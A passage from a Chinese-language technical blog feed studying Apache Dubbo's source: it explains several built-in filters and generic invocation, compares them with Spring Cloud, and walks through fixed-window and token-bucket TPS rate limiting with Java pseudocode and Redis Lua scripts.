<span class="hljs-attr">key</span>=<span class="hljs-string">"accesslog"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:service</span>&gt;</span></code></pre><h5 id="实现原理-4"><a href="#实现原理-4" class="headerlink" title="实现原理"></a>实现原理</h5><p>参见AccessLogFilter 代码，比较简单。</p><h5 id="与Spring-Cloud对比-4"><a href="#与Spring-Cloud对比-4" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>zuul网关也支持。<br>zuul.debug.request=true  #如果设置了这个，默认所有的请求都会debug<br>zuul.include-debug-header: true  #打印头<br>未设置zuul.debug.request=true，可以用zuul_host:zuul_port/路径?debug=true    debug你的指定请求  </p><h4 id="ActiveLimitFilter"><a href="#ActiveLimitFilter" class="headerlink" title="ActiveLimitFilter"></a>ActiveLimitFilter</h4><h5 id="作用-5"><a href="#作用-5" class="headerlink" title="作用"></a>作用</h5><p>在consumer端实现并发数控制，能支持到方法级。 </p><h5 id="使用方式-5"><a href="#使用方式-5" class="headerlink" title="使用方式"></a>使用方式</h5><p>在consumer侧配置  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"com.foo.BarService"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:method</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sayHello"</span> <span class="hljs-attr">actives</span>=<span class="hljs-string">"10"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:service</span>&gt;</span></code></pre><h5 id="实现原理-5"><a href="#实现原理-5" class="headerlink" title="实现原理"></a>实现原理</h5><p>ConcurrentHashMap 配合 AtomicInteger AtomicLong完成。相关代码参见 ActiveLimitFilter 与 RpcStatus。</p><h5 id="与Spring-Cloud对比-5"><a href="#与Spring-Cloud对比-5" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>Spring Cloud也支持。  </p><p>ExecuteLimitFilter 与之类似，只是用在了provider端。  </p><h4 id="ClassLoaderFilter"><a href="#ClassLoaderFilter" class="headerlink" title="ClassLoaderFilter"></a>ClassLoaderFilter</h4><h5 id="作用-6"><a href="#作用-6" class="headerlink" title="作用"></a>作用</h5><p>保持 调用下层invoker前后的ClassLoader一致  </p><h4 id="ContextFilter"><a href="#ContextFilter" class="headerlink" title="ContextFilter"></a>ContextFilter</h4><h5 id="作用-7"><a href="#作用-7" class="headerlink" title="作用"></a>作用</h5><p>在provider端，对一些dubbo自己使用的保留key进行过滤，防止别人误传。  </p><h5 id="实现原理-6"><a href="#实现原理-6" class="headerlink" title="实现原理"></a>实现原理</h5><p>参见代码即可，比较简单。  </p><h5 id="与Spring-Cloud对比-6"><a href="#与Spring-Cloud对比-6" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>N/A</p><h4 id="ConsumerContextFilter"><a href="#ConsumerContextFilter" class="headerlink" title="ConsumerContextFilter"></a>ConsumerContextFilter</h4><h5 id="作用-8"><a href="#作用-8" class="headerlink" title="作用"></a>作用</h5><p>在consumer端，进行一些参数设置，诸如本端地址，对端地址等。    </p><h5 id="使用方式-6"><a href="#使用方式-6" class="headerlink" title="使用方式"></a>使用方式</h5><p>无需配置，consumer侧默认使用。<br>在dubbo中，对于这些filter如果在META-INF中配置了且filter类的注解@Activate上没有配置value值，那么就是默认使用。 可以参见com.alibaba.dubbo.common.extension.ExtensionLoader.isActive(Activate, URL)方法实现。  </p><h5 id="实现原理-7"><a href="#实现原理-7" class="headerlink" title="实现原理"></a>实现原理</h5><p>参见代码即可，比较简单。  </p><h5 id="与Spring-Cloud对比-7"><a href="#与Spring-Cloud对比-7" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>N/A</p><h4 id="ExceptionFilter"><a href="#ExceptionFilter" class="headerlink" title="ExceptionFilter"></a>ExceptionFilter</h4><h5 id="作用-9"><a href="#作用-9" class="headerlink" title="作用"></a>作用</h5><p>在provider端，对调用异常进行选择性进行包装。<br>非受检异常直接抛出，jdk的异常直接抛出，异常类与接口类在一个jar包内的直接抛出，是服务接口方法自己声明的要throw的异常直接抛出。<br>其余包装成受检异常放到RpcResult中返回。    </p><h5 id="使用方式-7"><a href="#使用方式-7" class="headerlink" title="使用方式"></a>使用方式</h5><p>无需配置，provider侧默认使用。  </p><h5 id="实现原理-8"><a href="#实现原理-8" class="headerlink" title="实现原理"></a>实现原理</h5><p>参见代码即可，比较简单。  </p><h5 id="与Spring-Cloud对比-8"><a href="#与Spring-Cloud对比-8" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>N/A</p><h4 id="DeprecatedFilter"><a href="#DeprecatedFilter" class="headerlink" title="DeprecatedFilter"></a>DeprecatedFilter</h4><h5 id="作用-10"><a href="#作用-10" class="headerlink" title="作用"></a>作用</h5><p>对于DEPRECATED的方法打一行错误日志。  是配置在consumer端，没太明白他的实际作用，既然要在consumer端配置DEPRECATED，还要打日志做啥呢？consumer端就知道了啊。 有点不解。 或许就是为了标注，这是一个废弃的调用吧。  </p><h5 id="使用方式-8"><a href="#使用方式-8" class="headerlink" title="使用方式"></a>使用方式</h5><p>consumer端配置。  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"userService"</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"deprecated"</span> &gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:method</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"queryUser"</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"deprecated"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span> /&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:method</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:reference</span>&gt;</span></code></pre><h5 id="实现原理-9"><a href="#实现原理-9" class="headerlink" title="实现原理"></a>实现原理</h5><p>参见代码即可，比较简单。  </p><h3 id="与Spring-Cloud对比-9"><a href="#与Spring-Cloud对比-9" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>Spring Cloud貌似没有这个能力。  </p><h4 id="CompatibleFilter"><a href="#CompatibleFilter" class="headerlink" title="CompatibleFilter"></a>CompatibleFilter</h4><h5 id="作用-11"><a href="#作用-11" class="headerlink" title="作用"></a>作用</h5><p>兼容适配器，能对结果返回值做一些类型转换，注入基本类型到装箱类型的互转，复合类型到序列化值的转换(依赖你配置的序列化类型)等。    </p><h5 id="使用方式-9"><a href="#使用方式-9" class="headerlink" title="使用方式"></a>使用方式</h5><p>在consumer配置的filter上加上compatible即可。  </p><h5 id="实现原理-10"><a href="#实现原理-10" class="headerlink" title="实现原理"></a>实现原理</h5><p>参见CompatibleFilter代码即可，比较简单。  </p><h4 id="TimeoutFilter"><a href="#TimeoutFilter" class="headerlink" title="TimeoutFilter"></a>TimeoutFilter</h4><h5 id="作用-12"><a href="#作用-12" class="headerlink" title="作用"></a>作用</h5><p>用在provider侧，对超时的服务调用，打一个警告日志。      </p><h5 id="使用方式-10"><a href="#使用方式-10" class="headerlink" title="使用方式"></a>使用方式</h5><p>无需配置，默认生效。 </p><h5 id="实现原理-11"><a href="#实现原理-11" class="headerlink" title="实现原理"></a>实现原理</h5><p>参见TimeoutFilter代码即可，比较简单。  </p><h4 id="TraceFilter"><a href="#TraceFilter" class="headerlink" title="TraceFilter"></a>TraceFilter</h4><h5 id="作用-13"><a href="#作用-13" class="headerlink" title="作用"></a>作用</h5><p>用在provider侧。     </p><h5 id="使用方式-11"><a href="#使用方式-11" class="headerlink" title="使用方式"></a>使用方式</h5><p>无需配置，默认启用这个filter，但是要真正trace，需要telnet管理台，给其发指令，才能真正trace。支持指定接口，指定方法，指定最大trace多少次。 </p><h5 id="实现原理-12"><a href="#实现原理-12" class="headerlink" title="实现原理"></a>实现原理</h5><p>trace的内容如下：</p><pre><code class="hljs java"><span class="hljs-keyword">if</span> (count &lt; max) &#123;    String prompt = channel.getUrl().getParameter(Constants.PROMPT_KEY, Constants.DEFAULT_PROMPT);      channel.send(<span class="hljs-string">"\r\n"</span> + RpcContext.getContext().getRemoteAddress() + <span class="hljs-string">" -&gt; "</span>                                        + invoker.getInterface().getName()                                        + <span class="hljs-string">"."</span> + invocation.getMethodName()                                        + <span class="hljs-string">"("</span> + JSON.toJSONString(invocation.getArguments()) + <span class="hljs-string">")"</span> + <span class="hljs-string">" -&gt; "</span> + JSON.toJSONString(result.getValue())                                        + <span class="hljs-string">"\r\nelapsed: "</span> + (end - start) + <span class="hljs-string">" ms."</span>                                        + <span class="hljs-string">"\r\n\r\n"</span> + prompt);&#125;</code></pre><h4 id="FutureFilter"><a href="#FutureFilter" class="headerlink" title="FutureFilter"></a>FutureFilter</h4><h5 id="作用-14"><a href="#作用-14" class="headerlink" title="作用"></a>作用</h5><p>用在consumer侧。<a href="http://dubbo.apache.org/zh-cn/docs/user/demos/events-notify.html" target="_blank" rel="noopener">dubbo的事件机制</a>支持oninvoke、onreturn、onreturn事件监听，就是靠这个filter完成对接。       </p><h5 id="使用方式-12"><a href="#使用方式-12" class="headerlink" title="使用方式"></a>使用方式</h5><p>参见<a href="http://dubbo.apache.org/zh-cn/docs/user/demos/events-notify.html" target="_blank" rel="noopener">dubbo的事件机制</a>。  </p><h5 id="实现原理-13"><a href="#实现原理-13" class="headerlink" title="实现原理"></a>实现原理</h5><p>比较简单，参见FutureFilter代码。或者参见<a href="https://blog.csdn.net/u013160932/article/details/81144471" target="_blank" rel="noopener">Dubbo源码分析—-过滤器之FutureFilter</a>  </p><h4 id="MonitorFilter"><a href="#MonitorFilter" class="headerlink" title="MonitorFilter"></a>MonitorFilter</h4><h5 id="作用-15"><a href="#作用-15" class="headerlink" title="作用"></a>作用</h5><p>consumer,provider侧都可用。 会将服务的耗时，并发数等送给监控服务。      </p><h5 id="使用方式-13"><a href="#使用方式-13" class="headerlink" title="使用方式"></a>使用方式</h5><p>filter默认启用，但是需要配置后才能触发监控。 配置dubbo:monitor。</p><h5 id="实现原理-14"><a href="#实现原理-14" class="headerlink" title="实现原理"></a>实现原理</h5><p>比较简单，参见MonitorFilter。  具体收集监控动作由<code>MonitorService</code>接口实现完成。dubbo自带了<code>DubboMonitor</code>实现。收集的数据暂时同步擦欧洲放在一个ConcurrentHashMap中，再由ScheduledExecutorService定时异步发送。</p><h5 id="与Spring-Cloud对比-10"><a href="#与Spring-Cloud对比-10" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>Spring Cloud有专门的组件干这个。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]26.泛化调用实现</title>
    <link href="/2020/06/13/dubbo-26.generic-invoke-impl/"/>
    <url>/2020/06/13/dubbo-26.generic-invoke-impl/</url>
    
    <content type="html"><![CDATA[<h2 id="26-泛化调用实现"><a href="#26-泛化调用实现" class="headerlink" title="26.泛化调用实现"></a>26.泛化调用实现</h2><p>看两个filter即可，剩下的filter下篇文章讲  </p><h4 id="GenericFilter"><a href="#GenericFilter" class="headerlink" title="GenericFilter"></a>GenericFilter</h4><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>先讨论一个问题，rpc，最简单的场景是consumer端调用provider端的一个服务，这个服务双方都遵循一个接口实现，按最简单的dubbo的demo玩法，是需要consumer和provider两段都要有这个接口声明的（包括接口参数的类型的相关类），比如：<br>org.simonme.dubbo.demo.provider.service.UserService.queryUser(int) 这是一个查询用户的服务接口，但是，如果consumer端没有这个服务的接口声明及其相关联的bean类，也就是如果仅仅在provider端能找到这个接口类，在consumer工程里压根没有这个类，那是否还能进行调用？<br>dubbo是可以的。 就是通过在proivder侧用GenericFilter达成目的。  </p><h5 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h5><p>需要在consumer端声明这个bean的时候，加上<code>generic=&quot;true&quot;</code>配置即可。  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"userService"</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">generic</span>=<span class="hljs-string">"true"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:reference</span>&gt;</span></code></pre><p>generic还支持nativejava和bean两个可选的选项。nativejava对应byte[]类型的参数，bean对应com.alibaba.dubbo.common.beanutil.JavaBeanDescriptor类型的参数。 </p><p>此外在使用这个服务时，形式略有不同：  </p><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> GenericService userService;<span class="hljs-meta">@SuppressWarnings</span>(<span class="hljs-string">"static-access"</span>)<span class="hljs-meta">@Test</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSayHello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    Object result = userService.$invoke(<span class="hljs-string">"queryUser"</span>, <span class="hljs-keyword">new</span> String[] &#123; <span class="hljs-string">"int"</span> &#125;,  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-number">100</span>&#125;);    System.out.println(result);    System.out.println(result.getClass());&#125;</code></pre><p>用<code>GenericService</code> 表示你这个未知的服务类型，用<code>$invoke</code>这个特殊方法发起的你的服务方法调用。调用完之后，dubbo会把结果以hashmap的形式返回给你。比如，我这里是个User的bean，User有id和name字段，那么返回的map中就与id和value两个key，其对应的值就是bean的这两个字段的字段值。<br>为了便于理解，贴一下UserService的代码:  </p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">queryUser</span><span class="hljs-params">(@Range(min=<span class="hljs-number">0</span>,message=<span class="hljs-string">"用户id值不能小于0"</span>)</span><span class="hljs-keyword">int</span> id)</span>;&#125;</code></pre><p>上面这个写法，解释了怎么在consumer端没有org.simonme.dubbo.demo.provider.service.UserService接口声明的时候，调用他的queryUser方法。provider端无需改动，和正常写rpc服务一样配置即可。<br>用法也可以参见官方文档，<a href="http://dubbo.apache.org/zh-cn/docs/user/demos/generic-reference.html" target="_blank" rel="noopener">使用泛化调用</a>。</p><h5 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h5><p>直接看GenericFilter代码，通过方法名(必须是$invoke),参数个数等判断是否命中，很简单，不再多说。 </p><h5 id="与Spring-Cloud对比"><a href="#与Spring-Cloud对比" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>Spring Cloud可以算有这个能力，因为Spring Cloud是http json的，http json天然不需要调用端有接口声明。</p><h4 id="GenericImplFilter"><a href="#GenericImplFilter" class="headerlink" title="GenericImplFilter"></a>GenericImplFilter</h4><h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>与 GenericFilter  类似，是一个相对的东西，他是用在provider端没有服务接口声明类时，使用的。使用方法可以参见官方文档<a href="http://dubbo.apache.org/zh-cn/docs/user/demos/generic-service.html" target="_blank" rel="noopener">实现泛化调用</a>。不再多说。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]25.TPS限流知识</title>
    <link href="/2020/06/13/dubbo-25.tps-flow-contril/"/>
    <url>/2020/06/13/dubbo-25.tps-flow-contril/</url>
    
    <content type="html"><![CDATA[<h2 id="25-TPS限流知识"><a href="#25-TPS限流知识" class="headerlink" title="25.TPS限流知识"></a>25.TPS限流知识</h2><h3 id="各种限流算法的称呼"><a href="#各种限流算法的称呼" class="headerlink" title="各种限流算法的称呼"></a>各种限流算法的称呼</h3><p>网上有很多文章介绍限流算法，但是对于这些算法的称呼与描述也是有点难以理解。不管那么多了。我先按我理解的维度梳理一下。<br>主要维度是：是<em>正向计数</em>还是<em>反向计数</em>。是<em>定点(时间点)重置当前计数器</em>还是<em>每次接口调用时按量调整当前还剩的可用请求数</em>。  </p><h4 id="通俗理解"><a href="#通俗理解" class="headerlink" title="通俗理解"></a>通俗理解</h4><h5 id="正向计数且定点-时间点-重置的流程"><a href="#正向计数且定点-时间点-重置的流程" class="headerlink" title="正向计数且定点(时间点)重置的流程"></a>正向计数且定点(时间点)重置的流程</h5><pre><code class="hljs html">                       +-------------------------+                       |     init value = 0      |                       +-----------+-------------+                                   |                                   |                                   |             +---------------------v----------------------+             |          when request arrived              |      +------+ detect lastReqTime+interval &gt; currentTime  +------+      |      |                                            |      |      Y      +--------------------------------------------+      |      |                                                          N      |                                                          |+-----v-----------------------+                  +---------------v----------+|      reset value = 0        |                  |                          |+-----------------------------+                  |  detect value &gt; thresold |             |                             +-----+                          +----+             |                             |     +--------------------------+    |             |                             N                                     |             |                             |                                     |             |                             v                                     |             |                   +---------+---------+                           |             |                   |                   |                           Y             |                   | value = value + 1 |                           |             |                   |                   |                           |             |                   +--------+----------+                           |             |                            |                                      |             |                    +-------v---------+                +-----------v-----+             +-------------------&gt;+  return true    |                |  return false   |                                  +-----------------+                +-----------------+</code></pre><p>几个参数解释下：  </p><ol><li>value：当前时间段有多少请求进来了，即计数器的值  </li><li>interval： 每次刷新计数器的时间间隔  </li><li>lastReqTime: 上次请求进来的时间点  </li><li>currentTime：当前时间点  </li><li>thresold：时间间隔(interval)内请求数的最大阈值<br>这样设计，如果你的interval设置成1秒钟，thresold设置成1000，那么意思就是每秒限制1000请求数的流控。  相当于tps=1000限流。  </li></ol><h5 id="反向计数"><a href="#反向计数" class="headerlink" title="反向计数"></a>反向计数</h5><p>反向计数计数初始化value时不是初始化成0，而是初始化成thresold(你的限制请求数量的阈值)。<br>然后每次请求进来的时候 value不是+1而是-1，reset value的时候也是重置成thresold。</p><h5 id="定点重置的lua脚本"><a href="#定点重置的lua脚本" class="headerlink" title="定点重置的lua脚本"></a>定点重置的lua脚本</h5><pre><code class="hljs lua"><span class="hljs-comment">-- 资源唯一标识</span><span class="hljs-keyword">local</span> key = KEYS[<span class="hljs-number">1</span>]<span class="hljs-comment">-- 时间窗口内最大并发数</span><span class="hljs-keyword">local</span> max_permits = <span class="hljs-built_in">tonumber</span>(KEYS[<span class="hljs-number">2</span>])<span class="hljs-comment">-- 窗口的间隔时间</span><span class="hljs-keyword">local</span> interval_milliseconds = <span class="hljs-built_in">tonumber</span>(KEYS[<span class="hljs-number">3</span>])<span class="hljs-comment">-- 获取的并发数</span><span class="hljs-keyword">local</span> permits = <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">1</span>])<span class="hljs-keyword">local</span> current_permits = <span class="hljs-built_in">tonumber</span>(redis.call(<span class="hljs-string">"get"</span>, key) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)<span class="hljs-comment">-- 如果超过了最大并发数，返回false</span><span class="hljs-keyword">if</span> (current_permits + permits &gt; max_permits) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><span class="hljs-keyword">else</span>    <span class="hljs-comment">-- 增加并发计数</span>    redis.call(<span class="hljs-string">"incrby"</span>, key, permits)    <span class="hljs-comment">-- 如果key中保存的并发计数为0，说明当前是一个新的时间窗口，它的过期时间设置为窗口的过期时间</span>    <span class="hljs-keyword">if</span> (current_permits == <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span>        redis.call(<span class="hljs-string">"pexpire"</span>, key, interval_milliseconds)    <span class="hljs-keyword">end</span>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-keyword">end</span></code></pre><h4 id="定点重置存在的问题"><a href="#定点重置存在的问题" class="headerlink" title="定点重置存在的问题"></a>定点重置存在的问题</h4><p>不论是正向计数还是反向计数，定点重置都存在一个问题：  </p><pre><code class="hljs html">        0r        1000r  1000r        0r0s               0.8s  1.0s  1.2              2.0s +----------------+-----+-----+----------------+-------&gt;timeline ^                ^     ^     ^                ^ |                |     |     |                | |                |     |     |                | |                |     |     |                | |                |     |     |                | +                +     +     +                +</code></pre><p>假设按上图时间线描述，0-0.8s系统没有收到请求，0.8-1.0s系统收到了1000个请求，1.0-1.2s系统又收到了1000个请求，1.2-2.0s系统收到了0个请求。这种场景其实是能通过上面的定点重置的流控的，但是实际在0.8s-1.2s这0.4s时间内tps达到了2000/(1.2-0.8)=5000的量，没能达到真正意义上的tps限流的述求。    </p><h4 id="每次接口调用时按量调整当前还剩的可用请求数且反向计数"><a href="#每次接口调用时按量调整当前还剩的可用请求数且反向计数" class="headerlink" title="每次接口调用时按量调整当前还剩的可用请求数且反向计数"></a>每次接口调用时按量调整当前还剩的可用请求数且反向计数</h4><p>这里先解释一下<em>按量</em>，按量就是：<br>假设上一次接口调用到这次接口调用间隔是2s，然后我们是1000tps限流，那么此时按量调整就是2sx1000r/s= +2000r。 也就是此时可用请求数按量加2000个。<br>整体逻辑比较复杂，先用java代码描述下：  </p><pre><code class="hljs java">-- keyString key = <span class="hljs-string">"流控实例id串"</span>; <span class="hljs-comment">// 通用代码，可以支持多个流控实例，控制不同的服务</span>-- 最大存储的令牌数<span class="hljs-keyword">int</span> max_permits = <span class="hljs-number">10000</span>;-- 每秒钟产生的令牌数<span class="hljs-keyword">int</span> permits_per_second = <span class="hljs-number">1000</span>; <span class="hljs-comment">// tps阈值</span>-- 请求的令牌数<span class="hljs-keyword">int</span> required_permits = <span class="hljs-number">1</span>; <span class="hljs-comment">// 请求数流控每次1个请求，如果是流量流控，可以从外面把这个传进来</span><span class="hljs-comment">// 存储流控逻辑中的数据用， 在redis中用hset代替。 [流控实例id串--&gt; [流程过程中需要的参数--&gt;参数值]]</span>Map&lt;String, Map&lt;String, Object&gt;&gt; storeMap = <span class="hljs-keyword">new</span> ConcurrentHashMap&lt;String, Map&lt;String, Object&gt;&gt;();-- 下次请求可以获取令牌的起始时间，初始值为<span class="hljs-number">0</span><span class="hljs-keyword">long</span> next_free_ticket_micros = storeMap.get(key).get(<span class="hljs-string">"next_free_ticket_micros"</span>) , <span class="hljs-keyword">default</span>: <span class="hljs-number">0</span> <span class="hljs-comment">// 取不到就用默认0</span>-- 当前时间<span class="hljs-keyword">long</span> now_micros = System.currentTimeMillis();-- 查询获取令牌是否超时<span class="hljs-keyword">if</span> (ARGV[<span class="hljs-number">1</span>] != <span class="hljs-keyword">null</span>) &#123;    -- 获取令牌的超时时间    <span class="hljs-keyword">long</span> timeout_micros = ARGV[<span class="hljs-number">1</span>];    <span class="hljs-keyword">long</span> micros_to_wait = next_free_ticket_micros - now_micros;    <span class="hljs-keyword">if</span> (micros_to_wait &gt; timeout_micros) &#123;        <span class="hljs-keyword">return</span> micros_to_wait    &#125;&#125;-- 当前存储的令牌数<span class="hljs-keyword">long</span> stored_permits = storeMap.get(key).get(<span class="hljs-string">"stored_permits"</span>) , <span class="hljs-keyword">default</span>: <span class="hljs-number">0</span> <span class="hljs-comment">// 取不到就用默认0</span>-- 添加令牌的时间间隔<span class="hljs-keyword">float</span> stable_interval_micros = <span class="hljs-number">1000</span> / permits_per_second;-- 补充令牌<span class="hljs-keyword">if</span> (now_micros &gt; next_free_ticket_micros) &#123;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 当前时间 到 下次请求可以获取令牌的起始时间 之间差多少毫秒  就补 多少毫秒/产生单个可用令牌的毫秒数</span><span class="hljs-comment"> * 比如 1000tps 则产生1个令牌要1毫秒，假设 上面差50毫秒，那么就可以有50个新令牌可以用</span><span class="hljs-comment"> *</span><span class="hljs-comment"> **/</span>    <span class="hljs-keyword">long</span> new_permits = (now_micros - next_free_ticket_micros) / stable_interval_micros;    stored_permits = math.min(max_permits, stored_permits + new_permits);  <span class="hljs-comment">// 取最大令牌数  与 存储令牌数+新可用令牌数 小的一个</span>    next_free_ticket_micros = now_micros; <span class="hljs-comment">// 将当前时间更新为next_free_ticket_micros ，因为有新令牌能用了嘛</span>&#125;-- 消耗令牌<span class="hljs-keyword">long</span> moment_available = next_free_ticket_micros;<span class="hljs-keyword">long</span> stored_permits_to_spend = math.min(required_permits, stored_permits); <span class="hljs-comment">// 将要花掉多少令牌， 请求数控制的是1  取小的是因为不能超过可用令牌数</span><span class="hljs-keyword">long</span> fresh_permits = required_permits - stored_permits_to_spend; <span class="hljs-comment">// 这次用掉的，要减掉</span><span class="hljs-keyword">long</span> wait_micros = fresh_permits * stable_interval_micros; <span class="hljs-comment">// fresh_permits &gt; 0 表示申请的令牌不够，则需要等，乘以每个令牌需要的产生时间，就是要等多久</span><span class="hljs-comment">// redis.replicate_commands() // 在redis脚本中调用time会有问题的规避</span>storeMap.get(key).put(<span class="hljs-string">"stored_permits"</span>, stored_permits - stored_permits_to_spend);storeMap.get(key).put(<span class="hljs-string">"next_free_ticket_micros"</span>, next_free_ticket_micros + wait_micros);<span class="hljs-comment">// redis.call('expire', key, 10) // 每隔10s刷新一下这个流控实例</span>-- 返回需要等待的时间长度<span class="hljs-keyword">return</span> moment_available - now_micros;</code></pre><p>最后贴一下redis的lua脚本:  </p><pre><code class="hljs lua"><span class="hljs-comment">-- key</span><span class="hljs-keyword">local</span> key = KEYS[<span class="hljs-number">1</span>]<span class="hljs-comment">-- 最大存储的令牌数</span><span class="hljs-keyword">local</span> max_permits = <span class="hljs-built_in">tonumber</span>(KEYS[<span class="hljs-number">2</span>])<span class="hljs-comment">-- 每秒钟产生的令牌数</span><span class="hljs-keyword">local</span> permits_per_second = <span class="hljs-built_in">tonumber</span>(KEYS[<span class="hljs-number">3</span>])<span class="hljs-comment">-- 请求的令牌数</span><span class="hljs-keyword">local</span> required_permits = <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">1</span>])<span class="hljs-comment">-- 下次请求可以获取令牌的起始时间</span><span class="hljs-keyword">local</span> next_free_ticket_micros = <span class="hljs-built_in">tonumber</span>(redis.call(<span class="hljs-string">'hget'</span>, key, <span class="hljs-string">'next_free_ticket_micros'</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)<span class="hljs-comment">-- 当前时间</span><span class="hljs-keyword">local</span> <span class="hljs-built_in">time</span> = redis.call(<span class="hljs-string">'time'</span>)<span class="hljs-keyword">local</span> now_micros = <span class="hljs-built_in">tonumber</span>(<span class="hljs-built_in">time</span>[<span class="hljs-number">1</span>]) * <span class="hljs-number">1000000</span> + <span class="hljs-built_in">tonumber</span>(<span class="hljs-built_in">time</span>[<span class="hljs-number">2</span>])<span class="hljs-comment">-- 查询获取令牌是否超时</span><span class="hljs-keyword">if</span> (ARGV[<span class="hljs-number">2</span>] ~= <span class="hljs-literal">nil</span>) <span class="hljs-keyword">then</span>    <span class="hljs-comment">-- 获取令牌的超时时间</span>    <span class="hljs-keyword">local</span> timeout_micros = <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">2</span>])    <span class="hljs-keyword">local</span> micros_to_wait = next_free_ticket_micros - now_micros    <span class="hljs-keyword">if</span> (micros_to_wait &gt; timeout_micros) <span class="hljs-keyword">then</span>        <span class="hljs-keyword">return</span> micros_to_wait    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-comment">-- 当前存储的令牌数</span><span class="hljs-keyword">local</span> stored_permits = <span class="hljs-built_in">tonumber</span>(redis.call(<span class="hljs-string">'hget'</span>, key, <span class="hljs-string">'stored_permits'</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)<span class="hljs-comment">-- 添加令牌的时间间隔</span><span class="hljs-keyword">local</span> stable_interval_micros = <span class="hljs-number">1000000</span> / permits_per_second<span class="hljs-comment">-- 补充令牌</span><span class="hljs-keyword">if</span> (now_micros &gt; next_free_ticket_micros) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">local</span> new_permits = (now_micros - next_free_ticket_micros) / stable_interval_micros    stored_permits = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">min</span>(max_permits, stored_permits + new_permits)    next_free_ticket_micros = now_micros<span class="hljs-keyword">end</span><span class="hljs-comment">-- 消耗令牌</span><span class="hljs-keyword">local</span> moment_available = next_free_ticket_micros<span class="hljs-keyword">local</span> stored_permits_to_spend = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">min</span>(required_permits, stored_permits)<span class="hljs-keyword">local</span> fresh_permits = required_permits - stored_permits_to_spend;<span class="hljs-keyword">local</span> wait_micros = fresh_permits * stable_interval_microsredis.replicate_commands()redis.call(<span class="hljs-string">'hset'</span>, key, <span class="hljs-string">'stored_permits'</span>, stored_permits - stored_permits_to_spend)redis.call(<span class="hljs-string">'hset'</span>, key, <span class="hljs-string">'next_free_ticket_micros'</span>, next_free_ticket_micros + wait_micros)redis.call(<span class="hljs-string">'expire'</span>, key, <span class="hljs-number">10</span>)<span class="hljs-comment">-- 返回需要等待的时间长度</span><span class="hljs-keyword">return</span> moment_available - now_micros</code></pre><h3 id="dubbo-tps限流-case"><a href="#dubbo-tps限流-case" class="headerlink" title="dubbo tps限流 case"></a>dubbo tps限流 